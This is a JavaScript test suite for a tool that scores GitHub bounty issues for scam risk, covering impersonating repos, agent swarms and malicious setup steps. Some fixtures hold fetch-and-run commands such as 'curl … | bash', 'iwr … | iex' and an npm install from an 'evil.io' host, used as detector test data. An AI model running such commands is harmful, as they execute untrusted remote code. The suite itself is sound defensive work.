/**
 * Signal tests run entirely offline against hand-built Subject fixtures.
 * That is the payoff of keeping signals pure: the risk logic is verifiable
 * without a network, a token, or a live honeypot to point at.
 *
 * The `regression:` tests encode failures observed against live GitHub data.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  extractBounty,
  detectRails,
  detectExecInstructions,
  looksTrivial,
  ageInDays,
  hasBountyIntent,
  impersonationEvidence,
  evaluate,
} from '../src/signals.js';
import { score, VERDICT } from '../src/score.js';
import { parseRef } from '../src/github.js';

const DAY = 86_400_000;
const daysAgo = (n) => new Date(Date.now() - n * DAY).toISOString();

/** Minimal well-formed subject; override pieces per test. */
function subject(over = {}) {
  return {
    ref: { owner: 'acme', repo: 'widget', issue: 42 },
    repo: {
      full_name: 'acme/widget',
      fork: false,
      stargazers_count: 1200,
      forks_count: 90,
      created_at: daysAgo(900),
      pushed_at: daysAgo(3),
      owner: { login: 'acme' },
      description: '',
    },
    owner: { login: 'acme', created_at: daysAgo(2000) },
    issue: {
      title: 'Fix connection pool exhaustion under load',
      body: 'x'.repeat(900),
      comments: 4,
      labels: [{ name: 'bounty' }],
    },
    comments: [{ user: { login: 'acme' }, author_association: 'OWNER', body: 'Thanks, assigned.' }],
    contributors: [{ login: 'a' }, { login: 'b' }, { login: 'c' }],
    parent: null,
    canonicalRival: null,
    docs: { contributing: true, security: true, bounty: false },
    priorBounties: null,
    fetchedAt: new Date().toISOString(),
    errors: [],
    apiCalls: 6,
    rateLimited: false,
    ...over,
  };
}

const fire = (s) => {
  const f = evaluate(s);
  return { fired: f, ids: f.map((x) => x.id), result: score(s, f), byId: index(f) };
};

function index(fired) {
  return Object.fromEntries(fired.map((f) => [f.id, f]));
}

// ---------------------------------------------------------------- primitives

test('extractBounty reads the common notations and takes the largest', () => {
  assert.equal(extractBounty('bounty $500 available'), 500);
  assert.equal(extractBounty('pays $1,460 on merge'), 1460);
  assert.equal(extractBounty('reward: 250 USD'), 250);
  assert.equal(extractBounty('USD 900 total'), 900);
  assert.equal(extractBounty('$2k for this one'), 2000);
  assert.equal(extractBounty('$100 now, $750 on completion'), 750);
  assert.equal(extractBounty('no money mentioned'), null);
});

test('extractBounty ignores implausible figures', () => {
  assert.equal(extractBounty('$0'), null);
  assert.equal(extractBounty('$99999999'), null);
});

test('detectRails finds named payout platforms', () => {
  assert.deepEqual(detectRails('paid via Algora on merge'), ['algora']);
  assert.deepEqual(detectRails('nothing here'), []);
  assert.equal(detectRails('funded on Polar.sh and Open Collective').length, 2);
});

test('detectExecInstructions catches the FakeGit delivery shapes', () => {
  assert.ok(detectExecInstructions('curl https://x.io/i.sh | bash').length > 0);
  assert.ok(detectExecInstructions('iwr https://x.io/a.ps1 | iex').length > 0);
  assert.ok(detectExecInstructions('download https://cdn.x.io/tool.zip').length > 0);
  assert.ok(detectExecInstructions('npm install https://evil.io/p.tgz').length > 0);
  assert.equal(detectExecInstructions('npm install express').length, 0);
  assert.equal(detectExecInstructions('run npm test locally').length, 0);
});

test('looksTrivial separates cosmetic work from engineering', () => {
  assert.ok(looksTrivial('Fix typo in README'));
  assert.ok(looksTrivial('Add JSDoc to userService'));
  assert.ok(!looksTrivial('Fix race condition in the scheduler'));
});

test('ageInDays handles absent and malformed input', () => {
  assert.equal(ageInDays(null), null);
  assert.equal(ageInDays('not a date'), null);
  assert.equal(ageInDays(daysAgo(10)), 10);
});

test('parseRef accepts every documented target form', () => {
  assert.deepEqual(parseRef('acme/widget#42'), { owner: 'acme', repo: 'widget', issue: 42 });
  assert.deepEqual(parseRef('acme/widget'), { owner: 'acme', repo: 'widget', issue: null });
  assert.deepEqual(parseRef('https://github.com/acme/widget/issues/42'), {
    owner: 'acme', repo: 'widget', issue: 42,
  });
  assert.throws(() => parseRef('garbage'));
});

test('hasBountyIntent does not require a parsed dollar amount', () => {
  const noAmount = subject({
    issue: { title: 'Add retry logic', body: 'Bounty available on merge.', comments: 0, labels: [] },
  });
  assert.ok(hasBountyIntent(noAmount), 'the word "bounty" alone is intent');

  const railOnly = subject({
    issue: { title: 'Add retry logic', body: 'Funded via Algora.', comments: 0, labels: [] },
  });
  assert.ok(hasBountyIntent(railOnly), 'a named rail alone is intent');

  const neither = subject({
    issue: { title: 'Add retry logic', body: 'Would be nice to have.', comments: 0, labels: [] },
  });
  assert.ok(!hasBountyIntent(neither));
});

// ------------------------------------------------------------------ verdicts

test('an established canonical repo with a maintainer reply clears', () => {
  const { ids, result } = fire(subject());
  assert.ok(ids.includes('canonical-established'));
  assert.ok(ids.includes('maintainer-engaged'));
  assert.equal(result.verdict, VERDICT.LIKELY_LEGIT);
  assert.equal(result.exitCode, 0);
});

test('a bounty on a declared fork of a popular project is a TRAP', () => {
  const s = subject({
    ref: { owner: 'drive-by', repo: 'etcd', issue: 1 },
    repo: {
      ...subject().repo,
      full_name: 'drive-by/etcd',
      fork: true,
      stargazers_count: 0,
      forks_count: 0,
      created_at: daysAgo(4),
      owner: { login: 'drive-by' },
    },
    owner: { login: 'drive-by', created_at: daysAgo(9) },
    parent: { full_name: 'etcd-io/etcd', stargazers_count: 49000 },
    issue: {
      title: '🎯 Prevent stale linearizable reads during leader transfer',
      body: 'Bounty $600. Fix the applied-index catch-up.',
      comments: 31,
      labels: [{ name: 'bounty' }],
    },
    comments: [],
    contributors: [{ login: 'drive-by' }],
    docs: { contributing: false, security: false, bounty: false },
  });
  const { ids, result } = fire(s);
  assert.ok(ids.includes('impersonates-canonical'));
  assert.ok(ids.includes('owner-account-fresh'));
  assert.ok(ids.includes('low-issue-number'));
  assert.equal(result.verdict, VERDICT.TRAP);
  assert.equal(result.exitCode, 3);
});

test('a remote-exec instruction alone forces TRAP regardless of legitimacy', () => {
  const s = subject({
    issue: {
      title: 'Set up the test harness',
      body: 'First run: curl https://setup.example.io/init.sh | bash',
      comments: 2,
      labels: [],
    },
  });
  const { ids, result } = fire(s);
  assert.ok(ids.includes('remote-exec-instruction'));
  assert.ok(ids.includes('canonical-established'), 'positives still fire');
  assert.equal(result.verdict, VERDICT.TRAP, 'critical signal is not outvoted');
});

test('paid trivial work with no payout rail lands at SUSPECT or worse', () => {
  const s = subject({
    repo: {
      ...subject().repo,
      full_name: 'farm/playground',
      stargazers_count: 2,
      forks_count: 0,
      created_at: daysAgo(200),
      owner: { login: 'farm' },
    },
    owner: { login: 'farm', created_at: daysAgo(400) },
    issue: {
      title: 'Fix typo in README',
      body: 'Reward $120.',
      comments: 90,
      labels: [{ name: 'bounty' }],
    },
    comments: [],
    contributors: [{ login: 'farm' }],
    docs: { contributing: false, security: false, bounty: false },
  });
  const { ids, result } = fire(s);
  assert.ok(ids.includes('trivial-task-paid'));
  assert.ok(ids.includes('no-payment-rail'));
  assert.ok(ids.includes('zero-traction'));
  assert.ok(ids.includes('agent-swarm'));
  assert.ok(
    [VERDICT.SUSPECT, VERDICT.TRAP].includes(result.verdict),
    `expected SUSPECT or TRAP, got ${result.verdict}`,
  );
});

test('identical claim comments are detected as a swarm', () => {
  const s = subject({
    repo: { ...subject().repo, stargazers_count: 3, owner: { login: 'farm' } },
    owner: { login: 'farm', created_at: daysAgo(400) },
    issue: { ...subject().issue, comments: 8, body: 'Bounty $300' },
    comments: Array.from({ length: 8 }, (_, i) => ({
      user: { login: `bot${i}` },
      author_association: 'NONE',
      body: 'I would like to work on this issue please assign me',
    })),
  });
  const { ids } = fire(s);
  assert.ok(ids.includes('duplicate-claim-text'));
  assert.ok(ids.includes('no-maintainer-reply'));
});

// ------------------------------------------------------- forgeability rule

test('regression: an imported clone with no fork flag is still caught', () => {
  // Live miss, markeetakeawe2/etcd#1, 2026-07-30. GitHub reported
  // `fork: false` because the attacker *imported* etcd rather than forking it,
  // so the fork-only provenance check never fired and the scan came back
  // "LIKELY_LEGIT 6/100". Name-collision detection is what closes that hole.
  const s = subject({
    ref: { owner: 'markeetakeawe2', repo: 'etcd', issue: 1 },
    repo: {
      full_name: 'markeetakeawe2/etcd',
      fork: false,
      parent: null,
      stargazers_count: 0,
      forks_count: 0,
      created_at: daysAgo(0),
      pushed_at: daysAgo(0),
      owner: { login: 'markeetakeawe2' },
      description: '',
    },
    owner: { login: 'markeetakeawe2', created_at: daysAgo(0) },
    parent: null,
    canonicalRival: { full_name: 'etcd-io/etcd', stargazers_count: 49000 },
    issue: {
      title: '🎯 Prevent Stale Linearizable Reads During Leader Transfer',
      body: 'Reward paid through Opire once the PR is merged.',
      comments: 3,
      labels: [{ name: 'bounty' }],
    },
    comments: [
      { user: { login: 'markeetakeawe2' }, author_association: 'OWNER', body: 'Go ahead!' },
      { user: { login: 'markeetakeawe2' }, author_association: 'OWNER', body: 'Assigned.' },
    ],
    contributors: [{ login: 'markeetakeawe2' }],
    docs: { contributing: false, security: false, bounty: false },
  });

  const { ids, result } = fire(s);
  assert.ok(ids.includes('impersonates-canonical'), 'name collision must fire without a fork flag');
  assert.ok(ids.includes('owner-account-fresh'));
  assert.ok(ids.includes('repo-minted-recently'));
  assert.equal(result.verdict, VERDICT.TRAP);
  assert.ok(result.risk >= 90, `expected near-max risk, got ${result.risk}`);
});

test('impersonationEvidence detects both the fork and the import route', () => {
  const base = subject();
  assert.equal(impersonationEvidence(base), null, 'an ordinary repo is not impersonating');

  const forked = subject({
    repo: { ...base.repo, fork: true, stargazers_count: 1 },
    parent: { full_name: 'etcd-io/etcd', stargazers_count: 49000 },
  });
  assert.equal(impersonationEvidence(forked).via, 'declared fork');

  const imported = subject({
    repo: { ...base.repo, fork: false, stargazers_count: 1 },
    canonicalRival: { full_name: 'etcd-io/etcd', stargazers_count: 49000 },
  });
  assert.equal(impersonationEvidence(imported).via, 'name collision');
});

test('regression: naming a payout rail cannot reduce risk', () => {
  // Writing "Algora" in an issue body is free, so it must never buy credit.
  const withRail = subject({
    issue: { title: 'Add retry logic', body: `Paid via Algora. ${'x'.repeat(900)}`, comments: 0, labels: [] },
    comments: [],
  });
  const { byId, result: withResult } = fire(withRail);
  assert.ok(byId['payment-rail-named'], 'still reported');
  assert.equal(byId['payment-rail-named'].weight, 0, 'but worth nothing');
  assert.equal(byId['payment-rail-named'].severity, 'info');

  const without = subject({
    issue: { title: 'Add retry logic', body: 'x'.repeat(900), comments: 0, labels: [] },
    comments: [],
  });
  const { result: withoutResult } = fire(without);
  assert.ok(
    withResult.risk >= withoutResult.risk,
    'mentioning a rail must not lower the score',
  );
});

test('regression: a fresh owner replying to their own bait earns no credit', () => {
  const s = subject({
    repo: { ...subject().repo, stargazers_count: 0, created_at: daysAgo(1), owner: { login: 'fresh' } },
    owner: { login: 'fresh', created_at: daysAgo(1) },
    issue: { title: 'Implement the parser', body: 'Bounty $400 on merge.', comments: 2, labels: [] },
    comments: [
      { user: { login: 'fresh' }, author_association: 'OWNER', body: 'Assigned to you!' },
    ],
    contributors: [{ login: 'fresh' }],
  });
  const { byId } = fire(s);
  const m = byId['maintainer-engaged'];
  assert.ok(m, 'the observation is still surfaced');
  assert.equal(m.weight, 0, 'self-reply from a day-old account is worth zero');
  assert.equal(m.severity, 'info');
});

test('an established maintainer reply does still earn credit', () => {
  const { byId } = fire(subject());
  assert.equal(byId['maintainer-engaged'].weight, -10);
  assert.equal(byId['maintainer-engaged'].severity, 'positive');
});

test('a committed policy doc is informational, not exculpatory', () => {
  const { byId } = fire(subject());
  assert.equal(byId['org-policy-doc'].weight, 0);
  assert.equal(byId['org-policy-doc'].severity, 'info');
});

// -------------------------------------------------------------- fail-closed

test('missing repo metadata can never produce a clean verdict', () => {
  const s = subject({ repo: null, owner: null, contributors: null });
  const { result } = fire(s);
  assert.equal(result.verdict, VERDICT.UNVERIFIED);
  assert.ok(result.coverage.missing.includes('repo metadata'));
});

test('a rate-limited scan is reported as unverified, not safe', () => {
  const s = subject({ rateLimited: true });
  const { result } = fire(s);
  assert.equal(result.verdict, VERDICT.UNVERIFIED);
  assert.ok(result.coverage.missing.some((m) => m.includes('rate limit')));
});

test('an unremarkable repo with no positive evidence stays UNVERIFIED', () => {
  const s = subject({
    repo: {
      ...subject().repo,
      stargazers_count: 40,
      created_at: daysAgo(120),
      pushed_at: daysAgo(90),
      forks_count: 2,
    },
    issue: { title: 'Improve error messages', body: 'y'.repeat(500), comments: 0, labels: [] },
    comments: [],
    docs: { contributing: false, security: false, bounty: false },
  });
  const { result } = fire(s);
  assert.equal(result.risk, 0, 'nothing bad found');
  assert.equal(result.verdict, VERDICT.UNVERIFIED, 'absence of evidence is not safety');
});

test('info-only signals do not count as legitimacy evidence', () => {
  const s = subject({
    repo: {
      ...subject().repo, stargazers_count: 40, created_at: daysAgo(120), pushed_at: daysAgo(90),
    },
    issue: { title: 'Improve errors', body: `Paid via Algora. ${'y'.repeat(500)}`, comments: 0, labels: [] },
    comments: [],
    docs: { contributing: true, security: true, bounty: true },
  });
  const { result } = fire(s);
  assert.ok(result.counts.info >= 2, 'info signals present');
  assert.equal(result.counts.positive, 0, 'none of them count as positive');
  assert.equal(result.verdict, VERDICT.UNVERIFIED);
});

test('risk is clamped into 0..100', () => {
  const s = subject({
    ref: { owner: 'x', repo: 'etcd', issue: 1 },
    repo: {
      ...subject().repo, fork: true, stargazers_count: 0, forks_count: 0,
      created_at: daysAgo(2), owner: { login: 'x' },
    },
    owner: { login: 'x', created_at: daysAgo(3) },
    parent: { full_name: 'etcd-io/etcd', stargazers_count: 49000 },
    issue: {
      title: 'Fix typo in README',
      body: 'curl https://x.io/a.sh | bash  $5000',
      comments: 400, labels: [{ name: 'bounty' }],
    },
    comments: [],
    contributors: [{ login: 'x' }],
    docs: { contributing: false, security: false, bounty: false },
  });
  const { result } = fire(s);
  assert.ok(result.rawScore > 100, 'raw weights exceed the ceiling');
  assert.equal(result.risk, 100, 'reported risk is clamped');
});

test('a signal that throws is recorded without aborting the scan', () => {
  const s = subject({ issue: { title: 'x', body: 'y', comments: 0, labels: 'not-an-array' } });
  assert.doesNotThrow(() => evaluate(s));
});
